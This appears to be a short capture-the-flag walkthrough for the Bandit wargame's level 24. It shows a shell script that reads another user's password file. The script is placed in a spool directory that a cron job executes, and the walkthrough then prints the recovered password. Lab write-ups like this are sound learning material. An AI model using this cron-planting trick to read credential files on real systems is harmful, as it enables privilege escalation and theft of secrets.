Had to create a temp directory and a small shell script:
```
#! /bin/sh

cat /etc/bandit_pass/bandit24 >> /tmp/tmp.dtcrocG2ir/passwd
```

Then copy that script to /var/spool/bandit24/foo.

Password for level 24 is `VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar`.
